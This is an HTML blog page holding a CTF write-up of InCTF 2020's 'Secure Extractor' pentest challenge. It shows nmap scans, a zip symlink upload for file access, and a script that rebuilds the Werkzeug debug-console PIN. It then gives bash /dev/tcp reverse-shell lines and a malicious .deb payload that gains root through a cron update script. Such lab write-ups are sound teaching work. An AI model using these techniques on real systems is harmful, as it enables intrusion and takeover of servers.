@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<title>
+    Inctf2020 Secure Extractor - bilith&rsquo;s blog
+</title>
+
+
+<link rel="shortcut icon" href="/icon.png">
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.29dc13dbe8de6b62d5f3574cbe12a2df7e0a0e7405d665c3ec4a7af7ccf35c0d.css" integrity="sha256-KdwT2&#43;jea2LV81dMvhKi334KDnQF1mXD7Ep698zzXA0=" crossorigin="anonymous" media="screen">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Didact+Gothic">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Inctf2020 Secure Extractor"/>
+<meta name="twitter:description" content="Secure Extractor [pentest, 22 solves] TLDR; You had to exploit file upload mechanism in python application to get access to python developer console. To escalate to the root user, you had to make use of bash script, which was executed every minute by cron.
+There are few CTFs during the year, which have &ldquo;pentest&rdquo; or &ldquo;network&rdquo; challanges. InCTF is one of them. For each challange you had to download separate OpenVPN config and connect to the enviroment."/>
+
+<meta property="og:title" content="Inctf2020 Secure Extractor" />
+<meta property="og:description" content="Secure Extractor [pentest, 22 solves] TLDR; You had to exploit file upload mechanism in python application to get access to python developer console. To escalate to the root user, you had to make use of bash script, which was executed every minute by cron.
+There are few CTFs during the year, which have &ldquo;pentest&rdquo; or &ldquo;network&rdquo; challanges. InCTF is one of them. For each challange you had to download separate OpenVPN config and connect to the enviroment." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://billith.github.io/posts/inctf2020-secure-extractor/" />
+<meta property="article:published_time" content="2020-08-02T21:27:26+02:00" />
+<meta property="article:modified_time" content="2020-08-02T21:27:26+02:00" />
+
+
+    
+
+    
+    
+    
+    <title>
+        
+        Inctf2020 Secure Extractor
+        
+    </title>
+</head>
+
+<body>
+    
+    
+    <header class="wrap flex-container">
+        <h1>Inctf2020 Secure Extractor</h1>
+    </header>
+    
+    <main class="wrap">
+        
+<div class="flex-container">
+    <aside role="complementary">
+        Sun Aug 02, 2020 &#183; 1002 words
+        <div class="tag-container">
+            
+            
+            <span class="tag">
+                <a href="/tags/ctf/">
+                    ctf
+                </a>
+            </span>
+            
+            
+            
+            <span class="tag">
+                <a href="/tags/pentest/">
+                    pentest
+                </a>
+            </span>
+            
+            
+            
+            <span class="tag">
+                <a href="/tags/network/">
+                    network
+                </a>
+            </span>
+            
+            
+            
+            <span class="tag">
+                <a href="/tags/python/">
+                    python
+                </a>
+            </span>
+            
+            
+        </div>
+    </aside>
+    <hr />
+    <article role="article">
+        <h1 id="secure-extractor">Secure Extractor</h1>
+<h4 id="pentest-22-solves">[pentest, 22 solves]</h4>
+<p><strong>TLDR</strong>; You had to exploit file upload mechanism in python application to get access to python developer console. To escalate to the root user, you had to make use of bash script, which was executed every minute by cron.</p>
+<p>There are few CTFs during the year, which have &ldquo;pentest&rdquo; or &ldquo;network&rdquo; challanges. InCTF is one of them. For each challange you had to download separate OpenVPN config and connect to the enviroment. Each team have it&rsquo;s own enviroment.</p>
+<p>First thing that I did, after connecting to the VPN, was scan of the network:</p>
+<pre><code>➜  nmap -sP 172.30.0.0/28
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 20:43 BST
+Nmap scan report for 172.30.0.4
+Host is up (0.16s latency).
+MAC Address: 02:42:D7:96:33:FB (Unknown)
+Nmap scan report for 172.30.0.14
+Host is up.
+Nmap done: 16 IP addresses (2 hosts up) scanned in 3.07 seconds
+</code></pre><p><code>172.30.0.14</code> was mine IP, so the target was <code>172.30.0.4</code>. Scan of all TCP ports showed that there was ssh and some service at port 5000:</p>
+<pre><code>➜  nmap -p- -vvv -sT -oN nmap/alltcp 172.30.0.4
+(...)
+Nmap scan report for 172.30.0.4
+Host is up, received arp-response (0.15s latency).
+Scanned at 2020-08-01 19:18:48 BST for 1370s
+Not shown: 65532 closed ports
+Reason: 65532 conn-refused
+PORT      STATE    SERVICE REASON
+22/tcp    open     ssh     syn-ack
+5000/tcp  open     upnp    syn-ack
+56921/tcp filtered unknown no-response
+MAC Address: 02:42:D7:96:33:FB (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1370.13 seconds
+           Raw packets sent: 1 (28B) | Rcvd: 1 (28B)
+</code></pre><p>Quick check of port 5000 revealed that it&rsquo;s a python application, prolly written in flask or django</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=utf-8</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">7435</span>
+Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Werkzeug/1.0.1 Python/3.6.9</span>
+</code></pre></div><p>Few ideas come to my mind when there&rsquo;s file upload and archive extraction in the application and the one that actually worked was symlink trick. Using standard <code>zip</code> command you can create zip archive that will pack symlink, without following it.</p>
+<pre><code>➜  ln -s / test
+➜  zip --symlinks -r test.zip test 
+  adding: test (stored 0%)
+</code></pre><p>After uploading crafted zip file, I had full filesystem access (where current user had permissions).
+<img src="/images/posts/secure-extractor-2.png" alt="image"></p>
+<p>Unfortunately, there wasn&rsquo;t any ssh keys or stored passwords. Also I couldn&rsquo;t view <code>/root</code>, so the application was running on low privileged user. After playing a bit with application I managed to crash it, by changing name parameter in Content-Disposition header.</p>
+<pre><code>Content-Disposition: form-data; name=&quot;invalid&quot;; filename=&quot;test.zip&quot;
+</code></pre><p>So I knew that developer console was enabled. However, it was protected by the PIN, which is generated on the application start. Some time ago I read post about pwning python applications. That post went into details about how is this PIN generated. Basically, if you have some kind of access to the filesystem (eg. through LFI or path traversal), you can recalucate this PIN.
+<img src="/images/posts/secure-extractor-1.png" alt="image"></p>
+<p>After a little bit of googling I found <a href="https://ctftime.org/writeup/17955">writeup</a> (great writeup btw.) that described whole process and has code that generates PIN. All I had to do was to gather some information from the filesystem.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
+<span style="color:#f92672">import</span> hashlib
+<span style="color:#f92672">import</span> getpass
+<span style="color:#f92672">import</span> os
+
+pin <span style="color:#f92672">=</span> None
+rv <span style="color:#f92672">=</span> None
+num <span style="color:#f92672">=</span> None
+
+probably_public_bits <span style="color:#f92672">=</span> [ 
+  <span style="color:#e6db74">&#39;joyhopkins&#39;</span>, <span style="color:#75715e"># username </span>
+  <span style="color:#e6db74">&#39;flask.app&#39;</span>,  <span style="color:#75715e"># modname</span>
+  <span style="color:#e6db74">&#39;Flask&#39;</span>,
+  <span style="color:#e6db74">&#39;/usr/local/lib/python3.6/dist-packages/flask/app.py&#39;</span> 
+] 
+
+private_bits <span style="color:#f92672">=</span> [ 
+  <span style="color:#e6db74">&#39;2486108042235&#39;</span>,  <span style="color:#75715e"># 02:42:d7:96:33:fb  </span>
+  <span style="color:#e6db74">&#39;bcba4b3f193446328c240f73bfd693ba&#39;</span>
+] 
+
+h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5() 
+
+<span style="color:#75715e"># Bit is going through every thing in probably_public_bits and private_bits</span>
+<span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
+        <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">if</span> isinstance(bit, unicode):
+        bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+    h<span style="color:#f92672">.</span>update(bit)
+h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cookiesalt&#34;</span>) 
+
+<span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> None: 
+    h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pinsalt&#34;</span>)
+    num <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%09d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">9</span>] 
+
+<span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> None: 
+    <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span> , <span style="color:#ae81ff">4</span> , <span style="color:#ae81ff">3</span>: 
+        <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: 
+            rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">.</span>join (num [x: x <span style="color:#f92672">+</span> group_size] <span style="color:#f92672">.</span>rjust (group_size, <span style="color:#e6db74">&#39;0&#39;</span>) 
+            <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size)) 
+            <span style="color:#66d9ef">break</span> 
+        <span style="color:#66d9ef">else</span>:
+            rv <span style="color:#f92672">=</span> num
+
+<span style="color:#66d9ef">print</span>(rv)
+</code></pre></div><p>The PIN generated for my instance was <code>520-633-406</code>. With access to python console, I could easily get reverse shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;bash -c &#39;bash &gt;&amp; -i /dev/tcp/172.30.0.14/443 0&gt;&amp;1&#39;)</span>
+</code></pre></div><p>Container had few processes running. One of them was cron. Quick glance on <code>/etc/crontab</code> showed that there was some bash script executed every minute.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joyhopkins@8f4ccaf7cf86:~/project/Uploads/zip$ cat /usr/bin/updater
+<span style="color:#75715e">#!/bin/bash</span>
+set -x
+server<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;updates.safextractor.lan&#34;</span>
+path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/uploads/packages/&#34;</span>
+
+download <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    server<span style="color:#f92672">=</span>$1
+    path<span style="color:#f92672">=</span>$2
+    mkdir -p /tmp/packagebuild <span style="color:#f92672">&amp;&amp;</span> cd /tmp/packagebuild
+    wget -r -np -R <span style="color:#e6db74">&#34;index.html*&#34;</span> http://$1$2
+<span style="color:#f92672">}</span>
+
+install_pkg <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    server<span style="color:#f92672">=</span>$1
+    path<span style="color:#f92672">=</span>$2
+    cd /tmp/packagebuild/$server$path
+    <span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>ls<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> dpkg -i $i <span style="color:#f92672">||</span> true; <span style="color:#66d9ef">done</span>   
+<span style="color:#f92672">}</span>
+
+nc -z $server <span style="color:#ae81ff">80</span>
+
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $? <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>
+<span style="color:#66d9ef">then</span>
+    echo <span style="color:#e6db74">&#34;Server Not Reachable!&#34;</span>
+    exit <span style="color:#ae81ff">1</span>
+<span style="color:#66d9ef">else</span>
+    download $server $path
+    install_pkg $server $path
+<span style="color:#66d9ef">fi</span>
+</code></pre></div><p>Script was downloading all the files, recursively from the web server and tried to install each of them with <code>dpkg</code>. However, at that moment it wasn&rsquo;t doing anything, because host <code>updates.safextractor.lan</code> was down. It didn&rsquo;t respond to pings or http requests. It&rsquo;s ip was &ldquo;hard coded&rdquo; in <code>/etc/hosts</code>.</p>
+<pre><code>joyhopkins@8f4ccaf7cf86:~/project/Uploads/zip$ cat /etc/hosts
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.30.0.4      8f4ccaf7cf86
+172.30.0.6       updates.safextractor.lan
+</code></pre><p>I was stuck, because I thought that I had to do some network ninjutsu, but after a while I realised, why I can&rsquo;t just take this ip since it&rsquo;s offline, right?</p>
+<pre><code>➜  ip a add 172.30.0.6/28 dev tap0
+➜  ip a                           
+(...)
+143: tap0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
+    link/ether 16:02:bf:7e:5d:68 brd ff:ff:ff:ff:ff:ff
+    inet 172.30.0.14/28 brd 172.30.0.15 scope global tap0
+       valid_lft forever preferred_lft forever
+    inet 172.30.0.6/28 scope global secondary tap0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::1402:bfff:fe7e:5d68/64 scope link 
+       valid_lft forever preferred_lft forever
+</code></pre><p>After a minute I received http request from <code>172.30.0.4</code>.</p>
+<pre><code>➜  python3 -m http.server 80                  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+172.30.0.4 - - [02/Aug/2020 22:39:02] code 404, message File not found
+172.30.0.4 - - [02/Aug/2020 22:39:02] &quot;GET /uploads/packages/ HTTP/1.1&quot; 404 -
+</code></pre><p>The last step was to craft malicious deb file and serve it to the target machine. To generate it I used <a href="https://github.com/mthbernardes/Derbie">Derbie</a>.</p>
+<pre><code>➜  cat ../payload.sh 
+#!/bin/bash
+bash -c 'bash -i &gt;&amp; /dev/tcp/172.30.0.14/443 0&gt;&amp;1'
+➜  python3 Derbie.py pwn ../payload.sh
+➜  mv debs/pwn_43_all.deb ../www
+➜  cd ../www
+➜  mkdir -p uploads/packages
+➜  mv pwn_43_all.deb uploads/packages
+</code></pre><p>A minute later root was pwned.</p>
+<pre><code>inctf{35526e4b5039555065676d3533556138646d334136446a524b74723578757671}
+</code></pre>
+    </article>
+</div>
+
+
+        
+<nav role="navigation" class="flex-container bottom-menu">
+    
+<hr />
+<p>
+
+
+    
+        <a href="/posts">back</a>
+        
+            &#183;
+        
+    
+
+    
+        
+            <a href="/about/">whoami</a>
+        
+    
+    
+        
+            &#183; 
+            <a href="/posts/">posts</a>
+        
+    
+    &#183; 
+    <a href="/">
+        /
+    </a>
+
+</p>
+</nav>
+
+    </main>
+    
+    <footer class="flex-container footer"></footer>
+    
+    
+</body>
+
+</html>
